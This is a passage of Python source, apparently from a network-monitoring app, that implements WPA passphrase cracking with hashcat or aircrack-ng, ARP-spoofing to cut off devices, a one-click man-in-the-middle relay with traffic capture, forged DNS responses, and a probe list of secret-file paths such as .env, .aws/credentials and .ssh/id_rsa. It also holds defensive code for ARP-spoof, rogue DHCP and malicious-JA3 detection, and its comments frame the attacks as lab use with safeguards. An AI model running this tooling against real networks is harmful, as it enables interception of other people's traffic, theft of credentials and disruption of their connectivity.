                        with open(p, "rb") as f:
                            lines = sum(1 for _ in f)
                except Exception:
                    pass
                out.append({"name": fn, "size": os.path.getsize(p), "lines": lines})
    except Exception:
        pass
    return out


def start_crack_job(handshake_id: int, wordlist_name: str) -> tuple[bool, str, str | None]:
    """Crack a captured handshake with hashcat (-m 22000) or aircrack-ng (CPU fallback).
    Authorized-lab feature: tests passphrase strength of YOUR OWN captured material."""
    conn = get_db()
    row = conn.execute("SELECT * FROM wifi_handshakes WHERE id=?", (handshake_id,)).fetchone()
    conn.close()
    if not row:
        return False, "handshake not found", None
    wpath = _resolve_wordlist(wordlist_name)
    if not wpath:
        return False, f"wordlist not found in {WORDLIST_DIR} (see GET /api/wifi/wordlists)", None
    hcx = (row["hashcat_22000"] or "").strip()
    pcap = row["pcap_path"] or ""
    engine = None
    hashfile = None
    if shutil.which("hashcat") and hcx:
        engine = "hashcat"
        hashfile = os.path.join(tempfile.mkdtemp(prefix="na_crack_"), f"{handshake_id}.hc22000")
        with open(hashfile, "w") as f:
            f.write(hcx + "\n")
    elif shutil.which("aircrack-ng") and pcap and os.path.exists(pcap):
        engine = "aircrack-ng"
    if not engine:
        return False, "Need hashcat (+hc22000 line) or aircrack-ng (+pcap). Install via Settings & Tools.", None

    job_id = f"crack_{secrets.token_hex(6)}"
    with crack_lock:
        crack_jobs[job_id] = {"job_id": job_id, "handshake_id": handshake_id,
                              "engine": engine, "wordlist": os.path.basename(wpath),
                              "status": "running", "log": [], "password": "",
                              "started_at": datetime.now().isoformat(), "finished_at": None,
                              "proc": None}

    def run():
        j = crack_jobs[job_id]

        def log(m: str):
            with crack_lock:
                j["log"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {m}")
                if len(j["log"]) > 300:
                    j["log"][:] = j["log"][-300:]

        try:
            pot = os.path.join(tempfile.mkdtemp(prefix="na_pot_"), "out.pot")
            if engine == "hashcat":
                cmd = ["hashcat", "-m", "22000", "-a", "0", "--quiet",
                       "--status", "--status-timer", "5", "--potfile-path", pot,
                       hashfile, wpath]
            else:
                cmd = ["aircrack-ng", "-w", wpath, pcap]
            log("exec: " + " ".join(cmd))
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1,
                                    preexec_fn=os.setsid if hasattr(os, "setsid") else None)
            with crack_lock:
                j["proc_pid"] = proc.pid
            assert proc.stdout is not None
            found = ""
            for line in proc.stdout:
                log(line.rstrip()[:400])
                m = re.search(r"KEY FOUND! \[ ([^\]]+) \]", line)
                if m:
                    found = m.group(1)
                if j["status"] == "stopping":
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except Exception:
                        pass
                    break
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            # potfile parse (hashcat): hash:password
            if not found and engine == "hashcat" and os.path.exists(pot):
                try:
                    with open(pot, "r") as f:
                        for pl in f:
                            pl = pl.rstrip("\n")
                            if pl.startswith("WPA*") and ":" in pl:
                                found = pl.rsplit(":", 1)[1]
                except Exception:
                    pass
            with crack_lock:
                j["finished_at"] = datetime.now().isoformat()
                j["proc"] = None
                if found:
                    j["status"] = "cracked"
                    j["password"] = found
            if found:
                log(f"✔ CRACKED: '{found}'")
                conn = get_db()
                conn.execute("UPDATE wifi_handshakes SET cracked_password=? WHERE id=?",
                             (found, handshake_id))
                conn.commit(); conn.close()
                generate_alert("wifi_password_cracked",
                               f"Lab result: WPA passphrase for '{row['ssid'] or row['bssid']}' "
                               f"was cracked from the wordlist — rotate to a stronger passphrase.")
                audit("wifi_crack_success", details=f"hs={handshake_id} engine={engine}")
            else:
                with crack_lock:
                    j["status"] = "stopped" if j["status"] == "stopping" else "done"
                log("wordlist exhausted — passphrase not in list (this is GOOD for your network).")
            audit("wifi_crack_finished", details=f"hs={handshake_id} found={bool(found)}",
                  success=1 if found else 0)
        except Exception as e:
            with crack_lock:
                j["status"] = "failed"
                j["finished_at"] = datetime.now().isoformat()
            log(f"✖ crack job failed: {e}")

    threading.Thread(target=run, daemon=True).start()
    return True, engine, job_id


def crack_job(job_id: str) -> dict | None:
    with crack_lock:
        j = crack_jobs.get(job_id)
        if not j:
            return None
        out = dict(j, log=list(j["log"]))
        out.pop("proc", None)
        return out


def stop_crack_job(job_id: str) -> tuple[bool, str]:
    with crack_lock:
        j = crack_jobs.get(job_id)
        if not j:
            return False, "job not found"
        if j["status"] != "running":
            return False, f"job is {j['status']}"
        j["status"] = "stopping"
    return True, "stopping…"


# ============================================================
# BLOCK/MITM/DNS-SPOOF (kept from original)
# ============================================================
blocking_threads: dict[str, dict] = {}


def block_device(target_ip: str, gateway_ip: str) -> tuple[bool, str]:
    if not SCAPY_AVAILABLE:
        return False, "Scapy not installed"

    def spoof_loop():
        try:
            target_mac = get_mac_from_arp(target_ip)
            if not target_mac:
                return
            while blocking_threads.get(target_ip, {}).get("active"):
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=0)
                time.sleep(1)
        except Exception:
            pass

    blocking_threads[target_ip] = {"active": True}
    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    blocking_threads[target_ip]["thread"] = t
    return True, "Device blocked"


def unblock_device(target_ip: str, gateway_ip: str) -> tuple[bool, str]:
    if target_ip in blocking_threads:
        blocking_threads[target_ip]["active"] = False
        time.sleep(1)
        if SCAPY_AVAILABLE:
            try:
                target_mac = get_mac_from_arp(target_ip)
                gw_mac = get_mac_from_arp(gateway_ip)
                if target_mac and gw_mac:
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gw_mac), count=5, verbose=0)
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)
            except Exception:
                pass
        blocking_threads.pop(target_ip, None)
    return True, "Device unblocked"


def start_mitm_attack(target_ip, enable_dns_spoof=False, fake_ip=None):
    global active_mitm_attacks
    if not SCAPY_AVAILABLE:
        return False, "Scapy not installed"
    gw = get_default_gateway()
    # Safety guard: never poison the gateway or ourselves — that kills the LAN
    if target_ip == gw:
        return False, "Refusing to MITM the gateway (would blackhole the whole LAN)"
    if target_ip == get_local_ip():
        return False, "Refusing to MITM ourselves"
    if target_ip in active_mitm_attacks and active_mitm_attacks[target_ip].get("active"):
        return False, "MITM already running on this target"
    target_mac = get_mac_from_arp(target_ip)
    if not target_mac:
        return False, "Could not resolve target MAC"
    gw_mac = get_mac_from_arp(gw)
    if not gw_mac:
        return False, "Could not resolve gateway MAC"
    if fake_ip is None:
        fake_ip = get_local_ip()

    def mitm_loop():
        try:
            while active_mitm_attacks.get(target_ip, {}).get("active"):
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw), verbose=0)
                send(ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=target_ip), verbose=0)
                time.sleep(1)
        finally:
            try:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw, hwsrc=gw_mac), count=3, verbose=0)
                send(ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=0)
            except Exception:
                pass

    active_mitm_attacks[target_ip] = {"active": True, "dns_spoof": enable_dns_spoof, "fake_ip": fake_ip}
    th = threading.Thread(target=mitm_loop, daemon=True)
    th.start()
    active_mitm_attacks[target_ip]["thread"] = th
    audit("start_mitm", device_ip=target_ip, details=f"dns_spoof={enable_dns_spoof} fake_ip={fake_ip}")
    return True, f"MITM started on {target_ip}"


def stop_mitm_attack(target_ip):
    global active_mitm_attacks
    if target_ip not in active_mitm_attacks:
        return False, "No MITM running"
    active_mitm_attacks[target_ip]["active"] = False
    time.sleep(1)
    active_mitm_attacks.pop(target_ip, None)
    audit("stop_mitm", device_ip=target_ip, details="stopped")
    return True, f"MITM stopped on {target_ip}"


def get_active_mitm_attacks():
    return [{"target_ip": ip, "active": v.get("active"), "dns_spoof_enabled": v.get("dns_spoof"), "fake_ip": v.get("fake_ip")}
            for ip, v in active_mitm_attacks.items()]


# ============================================================
# BATCH I: MITM WIZARD — one-click ARP relay + capture
# (bettercap-style guided flow for your OWN lab network;
#  TLS contents are NOT decrypted by design)
# ============================================================
def _ip_forward_get() -> str | None:
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip()
    except Exception:
        return None


def _ip_forward_set(value: int) -> str | None:
    """Set net.ipv4.ip_forward; returns the previous value (None if unable)."""
    prev = _ip_forward_get()
    if prev is None:
        return None
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(value))
        return prev
    except Exception as e:
        print(f"[!] ip_forward write failed ({e}) — root required for MITM relay")
        return None


def start_mitm_wizard(target_ip: str, stop_capture_first: bool = True) -> tuple[bool, str]:
    """One-click MITM: enable IP forwarding (so the victim keeps working),
    poison ARP both ways, and start the traffic viewer capture automatically."""
    global mitm_wizard_state
    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        return False, "bad target ip"
    if mitm_wizard_state.get("target_ip"):
        return False, f"wizard already running on {mitm_wizard_state['target_ip']} — stop it first"
    prev_ok = True
    if platform.system() == "Linux":
        prev = _ip_forward_set(1)
        prev_ok = prev is not None
        mitm_wizard_state["forward_prev"] = prev
        if not prev_ok:
            return False, "Could not enable IP forwarding (root required) — aborting before any ARP change"
    ok, msg = start_mitm_attack(target_ip)
    if not ok:
        # roll back forwarding
        if mitm_wizard_state.get("forward_prev") is not None:
            _ip_forward_set(int(mitm_wizard_state["forward_prev"]))
        mitm_wizard_state["forward_prev"] = None
        return False, msg
    # Start traffic capture so intercepted HTTP/DNS/SNI shows up in Live Traffic
    cok, cmsg = start_packet_capture(None, "")
    mitm_wizard_state["pcap_started"] = cok
    mitm_wizard_state["target_ip"] = target_ip
    mitm_wizard_state["started_at"] = datetime.now().isoformat()
    audit("mitm_wizard_start", device_ip=target_ip,
          details=f"forwarding=on capture={cok}")
    generate_alert("mitm_lab", f"MITM lab relay started on {target_ip} — remember to stop it when done")
    return True, f"MITM relay active on {target_ip} (forwarding on, capture running). Stop it when done!"


def stop_mitm_wizard() -> tuple[bool, str]:
    """Undo everything: stop spoofing, restore ARP, restore forwarding, stop capture."""
    global mitm_wizard_state
    target = mitm_wizard_state.get("target_ip")
    msgs = []
    if target:
        ok, m = stop_mitm_attack(target)
        msgs.append(m)
    else:
        msgs.append("no active MITM target")
    prev = mitm_wizard_state.get("forward_prev")
    if prev is not None:
        _ip_forward_set(int(prev))
        msgs.append(f"ip_forward restored to {prev}")
    if mitm_wizard_state.get("pcap_started"):
        stop_packet_capture()
        msgs.append("capture stopped")
    mitm_wizard_state = {"target_ip": None, "forward_prev": None, "pcap_started": False}
    audit("mitm_wizard_stop", device_ip=target or "", details="; ".join(msgs))
    return True, "; ".join(msgs)


def mitm_wizard_status() -> dict:
    target = mitm_wizard_state.get("target_ip")
    fwd = _ip_forward_get()
    intercepted = {"http": 0, "dns": 0, "tls_sni": 0}
    if target:
        with data_lock:
            for t in live_traffic:
                if t.get("source_ip") == target:
                    key = {"HTTP": "http", "DNS": "dns", "TLS_SNI": "tls_sni"}.get(t.get("type"))
                    if key:
                        intercepted[key] += 1
    return {"target_ip": target, "active": bool(target),
            "ip_forward": fwd, "started_at": mitm_wizard_state.get("started_at"),
            "forwarding_note": "TLS contents are NOT decrypted (no sslstrip) — HTTP hosts, DNS and TLS SNI are visible.",
            "intercepted": intercepted,
            "active_mitm": get_active_mitm_attacks()}


DNS_SPOOF_RULES: dict[str, str] = {}


def add_dns_spoof_rule(domain, fake_ip):
    with data_lock:
        DNS_SPOOF_RULES[domain.lower()] = fake_ip
    return True, f"DNS spoof: {domain} -> {fake_ip}"


def remove_dns_spoof_rule(domain):
    with data_lock:
        DNS_SPOOF_RULES.pop(domain.lower(), None)
    return True, "removed"


def get_dns_spoof_rules():
    with data_lock:
        return [{"domain": d, "fake_ip": i} for d, i in DNS_SPOOF_RULES.items()]


def spoof_dns_response(pkt, domain, dns_server):
    fake_ip = DNS_SPOOF_RULES.get(domain.lower(), get_local_ip())
    resp = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / IP(src=dns_server, dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].dport) / DNS(
        id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=domain, rdata=fake_ip, type="A", ttl=60)
    )
    send(resp, verbose=0)
    return fake_ip


# ============================================================
# PACKET PROCESSING (DNS/MITM/JA3)
# ============================================================
def _parse_client_hello(body):
    try:
        if len(body) < 4:
            return None
        body = body[4:]
        if len(body) < 2:
            return None
        tls_version = struct.unpack(">H", body[0:2])[0]
        p = 2 + 32
        if p + 1 > len(body):
            return None
        sid_len = body[p]; p += 1 + sid_len
        if p + 2 > len(body):
            return None
        clen = struct.unpack(">H", body[p:p+2])[0]; p += 2
        if p + clen > len(body):
            return None
        ciphers = list(struct.unpack(f">{clen//2}H", body[p:p+clen])); p += clen
        if p + 1 > len(body):
            return None
        cmplen = body[p]; p += 1 + cmplen
        exts = []; groups = []; ecf = []
        if p + 2 <= len(body):
            etotal = struct.unpack(">H", body[p:p+2])[0]; p += 2
            eend = min(p + etotal, len(body))
            while p + 4 <= eend:
                etype, elen = struct.unpack(">HH", body[p:p+4]); p += 4
                edata = body[p:p+elen]; p += elen
                exts.append(etype)
                if etype == 10 and len(edata) >= 2:
                    glen = struct.unpack(">H", edata[0:2])[0]
                    gdata = edata[2:2+glen]
                    for i in range(0, len(gdata)-1, 2):
                        groups.append(struct.unpack(">H", gdata[i:i+2])[0])
                elif etype == 11 and len(edata) >= 1:
                    fl = edata[0]
                    ecf = list(edata[1:1+fl])
        return tls_version, ciphers, exts, groups, ecf
    except Exception:
        return None


def extract_sni(pkt):
    try:
        if TCP not in pkt or Raw not in pkt:
            return None
        data = bytes(pkt[Raw].load)
        off = 0
        while off + 5 <= len(data):
            rtype, _ver, rlen = data[off], struct.unpack(">H", data[off+1:off+3])[0], struct.unpack(">H", data[off+3:off+5])[0]
            if rtype == 22 and rlen > 4 and off + 5 + rlen <= len(data):
                hs = data[off+5:off+5+rlen]
                if hs[0] == 1:
                    body = hs[4:]
                    p = 2 + 32
                    if p + 1 > len(body): return None
                    p += 1 + body[p]
                    if p + 2 > len(body): return None
                    clen = struct.unpack(">H", body[p:p+2])[0]; p += 2 + clen
                    if p + 1 > len(body): return None
                    p += 1 + body[p]
                    if p + 2 > len(body): return None
                    etotal = struct.unpack(">H", body[p:p+2])[0]; p += 2
                    eend = min(p + etotal, len(body))
                    while p + 4 <= eend:
                        etype, elen = struct.unpack(">HH", body[p:p+4]); p += 4
                        edata = body[p:p+elen]; p += elen
                        if etype == 0 and len(edata) >= 5:
                            nl = struct.unpack(">H", edata[3:5])[0]
                            return edata[5:5+nl].decode("utf-8", errors="ignore")
                off += 5 + rlen
            else:
                off += 1
    except Exception:
        return None
    return None


def calculate_ja3(pkt):
    try:
        if TCP not in pkt or Raw not in pkt:
            return None, None
        data = bytes(pkt[Raw].load)
        off = 0
        while off + 5 <= len(data):
            rtype, _ver, rlen = data[off], struct.unpack(">H", data[off+1:off+3])[0], struct.unpack(">H", data[off+3:off+5])[0]
            if rtype == 22 and rlen > 4 and off + 5 + rlen <= len(data):
                hs = data[off+5:off+5+rlen]
                if hs[0] == 1:
                    parsed = _parse_client_hello(hs)
                    if not parsed:
                        return None, None
                    v, cs, ex, gr, ef = parsed
                    raw = f"{v},{','.join(map(str,cs))},{','.join(map(str,ex))},{','.join(map(str,gr))},{','.join(map(str,ef))}"
                    return hashlib.md5(raw.encode()).hexdigest(), raw
                off += 5 + rlen
            else:
                off += 1
    except Exception as e:
        print(f"[!] JA3 error: {e}")
    return None, None


def process_dns_query(pkt, source_ip, source_mac):
    global dns_queries
    try:
        if DNS not in pkt or DNSQR not in pkt:
            return
        qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
        qtype = pkt[DNSQR].type
        score = 0; cat = "benign"; mal = 0
        sus_tlds = [".xyz", ".top", ".club", ".work", ".click", ".link", ".gq", ".ml", ".cf", ".tk", ".ga"]
        if any(qname.lower().endswith(t) for t in sus_tlds):
            score += 20; cat = "suspicious_tld"
        parts = qname.split(".")
        if len(parts) > 1:
            main = parts[0]
            if len(main) > 15 and sum(c.isdigit() for c in main) > 5:
                score += 30; cat = "possible_dga"
        if any(kw in qname.lower() for kw in ["malware","virus","trojan","c2","botnet","evil"]):
            score += 50; cat = "known_malware"; mal = 1
        if len(qname) > 50:
            score += 25; cat = "possible_tunneling"
        entry = {"timestamp": datetime.now().isoformat(), "source_ip": source_ip, "source_mac": source_mac,
                 "query_name": qname, "query_type": str(qtype), "threat_score": score, "threat_category": cat, "is_malicious": mal}
        with data_lock:
            dns_queries.append(entry)
            if len(dns_queries) > DNS_QUERY_LIMIT:
                dns_queries[:] = dns_queries[-DNS_QUERY_LIMIT:]
        conn = get_db()
        conn.execute("INSERT INTO dns_query_log (timestamp,source_ip,source_mac,query_name,query_type,threat_score,threat_category,is_malicious) VALUES (?,?,?,?,?,?,?,?)",
                     (entry["timestamp"], source_ip, source_mac, qname, str(qtype), score, cat, mal))
        base = ".".join(qname.split(".")[-2:]) if len(qname.split(".")) > 1 else qname
        conn.execute("INSERT INTO passive_dns_log (timestamp,source_mac,source_ip,domain,visit_count) VALUES (?,?,?,?,1) "
                     "ON CONFLICT(source_mac,domain) DO UPDATE SET visit_count=visit_count+1, timestamp=excluded.timestamp, source_ip=excluded.source_ip",
                     (entry["timestamp"], source_mac, source_ip, base))
        conn.commit(); conn.close()
        if score >= 50:
            generate_alert("dns_threat", f"High-threat DNS: {qname} (score {score})", source_mac)
    except Exception as e:
        print(f"[!] DNS proc error: {e}")


def detect_mitm(pkt):
    if ARP not in pkt or pkt[ARP].op != 2:
        return
    ip = pkt[ARP].psrc; mac = pkt[ARP].hwsrc.upper()
    with data_lock:
        if ip not in arp_table:
            arp_table[ip] = set()
        known = set(arp_table[ip])
    if mac not in known and len(known) > 0:
        msg = f"ARP spoofing! {ip} has MACs {', '.join(sorted(known))}, {mac}"
        with data_lock:
            MITM_ALERTS.append({"timestamp": datetime.now().isoformat(), "ip": ip, "new_mac": mac,
                                "existing_macs": ", ".join(sorted(known)), "alert": msg})
            if len(MITM_ALERTS) > 100: MITM_ALERTS[:] = MITM_ALERTS[-100:]
        generate_alert("mitm_attack", msg, mac)
        audit("MITM_DETECTED", device_mac=mac, device_ip=ip, details=msg)
    with data_lock:
        arp_table[ip].add(mac)


def process_tls_fingerprint(pkt, source_ip, source_mac):
    if TCP not in pkt or pkt[TCP].dport != 443:
        return
    h, raw = calculate_ja3(pkt)
    if not h:
        return
    matched = KNOWN_MALWARE_JA3.get(h, "")
    sus = 1 if matched else 0
    entry = {"timestamp": datetime.now().isoformat(), "source_ip": source_ip, "source_mac": source_mac,
             "ja3_hash": h, "ja3_raw": (raw or "")[:500], "matched_malware": matched, "is_suspicious": sus}
    with data_lock:
        ja3_fingerprints.append(entry)
        if len(ja3_fingerprints) > JA3_LIMIT: ja3_fingerprints[:] = ja3_fingerprints[-JA3_LIMIT:]
    conn = get_db()
    conn.execute("INSERT INTO ja3_log (timestamp,source_ip,source_mac,ja3_hash,ja3_raw,matched_malware,is_suspicious) VALUES (?,?,?,?,?,?,?)",
                 (entry["timestamp"], source_ip, source_mac, h, entry["ja3_raw"], matched, sus))
    conn.commit(); conn.close()
    if matched:
        generate_alert("malware_ja3", f"Malware JA3 {h} -> {matched}", source_mac)


def detect_rogue_dhcp(pkt):
    if not pkt.haslayer(DHCP):
        return
    mtype = server_id = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple):
            if opt[0] == "message-type": mtype = opt[1]
            if opt[0] == "server_id": server_id = opt[1]
    if mtype not in (2, 5):
        return
    if Ether not in pkt or IP not in pkt:
        return
    smac = pkt[Ether].src.upper(); sip = pkt[IP].src
    gw = get_default_gateway()
    if sip != gw and server_id != gw:
        msg = f"Rogue DHCP: MAC={smac} IP={sip} offering server_id={server_id}"
        with data_lock:
            ROGUE_DHCP_ALERTS.append({"timestamp": datetime.now().isoformat(), "rogue_mac": smac, "rogue_ip": sip, "offered_server": server_id})
            if len(ROGUE_DHCP_ALERTS) > 50: ROGUE_DHCP_ALERTS[:] = ROGUE_DHCP_ALERTS[-50:]
        generate_alert("rogue_dhcp", msg, smac)


def packet_handler(pkt):
    global captured_packets, live_traffic, per_device_traffic, observed_tcp
    try:
        if DHCP in pkt and pkt.haslayer(DHCP):
            detect_rogue_dhcp(pkt)
        if IP in pkt:
            src_ip = pkt[IP].src
            src_mac = pkt[Ether].src.upper() if Ether in pkt else "unknown"
            if TCP in pkt:
                with data_lock:
                    prev = observed_tcp.get(src_ip, {})
                    prev["ttl"] = pkt[IP].ttl; prev["window"] = pkt[TCP].window; prev["last_seen"] = time.time()
                    observed_tcp[src_ip] = prev
                    if len(observed_tcp) > 500:
                        stale = [k for k,v in observed_tcp.items() if time.time()-v.get("last_seen",0) > 3600]
                        for k in stale[:100]: observed_tcp.pop(k, None)
            if DHCP in pkt:
                try:
                    for opt in pkt[DHCP].options:
                        if isinstance(opt, tuple) and opt[0] == "hostname":
                            with data_lock:
                                e = observed_tcp.setdefault(src_ip, {}); e["dhcp_hostname"] = opt[1].decode("utf-8", errors="ignore")
                except Exception:
                    pass
            if src_mac != "unknown":
                with data_lock:
                    info = per_device_traffic.get(src_mac, {"bytes":0,"packets":0,"last_seen":0})
                    info["bytes"] += len(pkt); info["packets"] += 1; info["last_seen"] = datetime.now().isoformat()
                    per_device_traffic[src_mac] = info
                if len(per_device_traffic) > 300:
                    with data_lock:
                        oldest = min(per_device_traffic, key=lambda k: per_device_traffic[k]["last_seen"])
                        per_device_traffic.pop(oldest, None)
            traffic_entry = None
            if TCP in pkt and Raw in pkt:
                try:
                    payload = pkt[Raw].load.decode("utf-8", errors="ignore")
                    if "Host:" in payload or "HTTP" in payload:
                        for line in payload.split("\r\n"):
                            if line.lower().startswith("host:"):
                                host = line.split(":",1)[1].strip()
                                traffic_entry = {"timestamp": datetime.now().isoformat(), "type":"HTTP","source_ip":src_ip,
                                                 "source_mac":src_mac,"domain":host,"details":f"HTTP -> {host}"}
                                break
                except Exception:
                    pass
            if DNS in pkt and DNSQR in pkt:
                process_dns_query(pkt, src_ip, src_mac)
                q = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                traffic_entry = {"timestamp": datetime.now().isoformat(),"type":"DNS","source_ip":src_ip,
                                 "source_mac":src_mac,"domain":q,"details":f"DNS query: {q}"}
                if DNS_SPOOF_RULES and q.lower() in DNS_SPOOF_RULES:
                    try:
                        dns_ip = pkt[IP].dst
                        fi = spoof_dns_response(pkt, q, dns_ip)
                        traffic_entry["details"] += f" [SPOOFED -> {fi}]"
                    except Exception as e:
                        print(f"[!] dns spoof error: {e}")
            try:
                sni = extract_sni(pkt)
                if sni:
                    traffic_entry = {"timestamp": datetime.now().isoformat(),"type":"TLS_SNI","source_ip":src_ip,
                                     "source_mac":src_mac,"domain":sni,"details":f"HTTPS -> {sni}"}
            except Exception:
                pass
            if traffic_entry:
                with data_lock:
                    live_traffic.append(traffic_entry)
                    if len(live_traffic) > LIVE_TRAFFIC_LIMIT: live_traffic[:] = live_traffic[-LIVE_TRAFFIC_LIMIT:]
            info = {"timestamp": datetime.now().isoformat(), "src_ip": src_ip, "dst_ip": pkt[IP].dst,
                    "protocol": pkt[IP].proto, "length": len(pkt)}
            if TCP in pkt:
                info.update({"src_port":pkt[TCP].sport,"dst_port":pkt[TCP].dport,"protocol_name":"TCP","flags":str(pkt[TCP].flags)})
            elif UDP in pkt:
                info.update({"src_port":pkt[UDP].sport,"dst_port":pkt[UDP].dport,"protocol_name":"UDP"})
            elif ICMP in pkt:
                info.update({"protocol_name":"ICMP","icmp_type":pkt[ICMP].type,"icmp_code":pkt[ICMP].code})
            else:
                info["protocol_name"] = "OTHER"
            detect_mitm(pkt)
            if TCP in pkt and Raw in pkt:
                process_tls_fingerprint(pkt, src_ip, src_mac)
            with data_lock:
                captured_packets.append(info)
                if len(captured_packets) > 1000: captured_packets[:] = captured_packets[-1000:]
    except Exception as e:
        print(f"[!] packet handler error: {e}")


def start_packet_capture(interface=None, filter_str="", count=0):
    global packet_capture_active
    if not SCAPY_AVAILABLE:
        return False, "Scapy not installed"
    def cap_loop():
        global packet_capture_active
        try:
            sniff(iface=interface, filter=filter_str, prn=packet_handler, store=0,
                  stop_filter=lambda x: not packet_capture_active, count=count)
        except Exception as e:
            print(f"[!] capture error: {e}")
        finally:
            packet_capture_active = False
    packet_capture_active = True
    threading.Thread(target=cap_loop, daemon=True).start()
    return True, "Packet capture started"


def stop_packet_capture():
    global packet_capture_active
    packet_capture_active = False
    return True, "Packet capture stopped"


def get_captured_packets(limit=100):
    with data_lock:
        return list(captured_packets[-limit:])


def clear_captured_packets():
    global captured_packets
    with data_lock:
        captured_packets = []
    return True, "Cleared"


# ============================================================
# WIFI (non-monitor) info & speedtest & messaging
# ============================================================
def send_network_message(target_ip, message):
    sys = platform.system()
    try:
        if sys == "Windows":
            subprocess.run(["msg", "*", f"/SERVER:{target_ip}", message], timeout=5)
            return True, "Message sent"
        if sys == "Linux":
            if shutil.which("smbclient"):
                subprocess.run(["smbclient", "-M", target_ip, "-U", "%"], input=message.encode(),
                               timeout=5, capture_output=True)
                return True, "Message sent (SMB)"
            return False, "smbclient not installed"
        return False, "Unsupported OS"
    except FileNotFoundError:
        return False, "Required tool missing"
    except Exception as e:
        return False, str(e)


def run_speed_test():
    if not SPEEDTEST_AVAILABLE:
        return {"error": "speedtest-cli not installed"}
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        dl = st.download()/1_000_000; ul = st.upload()/1_000_000
        srv = st.results.server
        return {"download": round(dl,2), "upload": round(ul,2), "ping": round(st.results.ping,2),
                "server": srv.get("sponsor","Unknown"), "server_location": f"{srv.get('name','')}, {srv.get('country','')}",
                "timestamp": datetime.now().isoformat()}
    except Exception as e:
        return {"error": str(e)}


# ============================================================
# BATCH D: RECON + DEEP-WEB SCAN + TOOL MANAGER
# ============================================================
DEEP_WEB_PATHS = [
    "", "/admin", "/administrator", "/admin.php", "/admin/login", "/admin/login.php",
    "/wp-admin", "/wp-login.php", "/wp-config.php.bak", "/phpmyadmin", "/pma", "/mysql",
    "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries", "/.htaccess", "/.htpasswd",
    "/.DS_Store", "/backup", "/backup.zip", "/backups", "/backup.sql", "/db.sql",
    "/dump.sql", "/database.sql", "/config.php", "/config.php.bak", "/config.yml",
    "/config.yaml", "/web.config", "/app.conf", "/settings.py", "/settings.json",
    "/server-status", "/server-info", "/phpinfo.php", "/info.php", "/test.php",
    "/piperror", "/cgi-bin/", "/cgi-bin/test.cgi", "/console", "/_debug", "/debug",
    "/debug.log", "/error.log", "/access.log", "/logs", "/log", "/tmp", "/temp",
    "/upload", "/uploads", "/files", "/file", "/data", "/api", "/api/v1", "/api/v2",
    "/api/users", "/api/admin", "/api/keys", "/api/debug", "/graphql", "/graphiql",
    "/swagger", "/swagger-ui", "/openapi.json", "/api-docs", "/actuator", "/actuator/env",
    "/jmx-console", "/web-console", "/manager/html", "/jenkins", "/gitweb",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/humans.txt", "/security.txt", "/.well-known/security.txt", "/favicon.ico",
    "/index.php", "/index.html", "/login", "/login.php", "/login.html", "/signin",
    "/signup", "/register", "/reset", "/forgot", "/password", "/change_password",
    "/dashboard", "/panel", "/cpanel", "/webmail", "/mail", "/owa", "/ecp",
    "/autodiscover/autodiscover.xml", "/.aws/credentials", "/gcp_key.json",
    "/id_rsa", "/id_rsa.pub", "/.ssh/id_rsa", "/.bash_history", "/.history",
    "/wp-admin/install.php", "/xmlrpc.php", "/wp-json/wp/v2/users",
    "/.vscode/sftp.json", "/.travis.yml", "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json", "/yarn.lock", "/docker-compose.yml",
    "/Dockerfile", "/k8s", "/kubernetes", "/kubeconfig", "/.kube/config",
    "/server.py", "/app.py", "/main.py", "/manage.py", "/Gemfile", "/.htpasswd",
    "/phpmyadmin/", "/phpMyAdmin/", "/phpmyadmin/index.php", "/myadmin", "/sqlmanager",
    "/adminer.php", "/adminer", "/dbadmin", "/mysqladmin", "/_profiler",
    "/trace.axd", "/elmah.axd", "/web.config.bak", "/www.zip", "/www.tar.gz",
    "/site.zip", "/site.tar.gz", "/html.zip", "/app.zip", "/code.zip",
    "/.well-known/openid-configuration", "/ws", "/wsdl", "/soap",
    "/api/swagger.json", "/v2/api-docs", "/swagger-resources",
    "/.dockerenv", "/_catalog", "/v2/_catalog", "/v1/_ping",
    "/metrics", "/healthz", "/health", "/ready", "/status", "/version", "/build",
    "/admin/login.jsp", "/user/login", "/portal", "/intranet",
    "/secret", "/secrets", "/private", "/internal", "/staging", "/dev",
    "/test", "/beta", "/old", "/new", "/mobile", "/api/internal",
    "/.env.bak", "/.env.local", "/.env.production", "/.env.development",
    "/.env.staging", "/.env.save", "/environment", "/ENV",
    "/_static", "/static/admin", "/media", "/assets", "/src",
    "/download", "/downloads", "/export", "/import", "/csv", "/json",
    # IoT / misc
    "/goform/SystemCommand", "/cgi-bin/luci", "/adv_cmds", "/ping", "/traceroute",
    "/setup.cgi", "/config.bin", "/config.backup", "/config.json",
    "/status.html", "/index.htm", "/home.html", "/main.html",
    "/stok", "/webpages/app.html", "/app.html", "/app.js", "/h5-1.html",
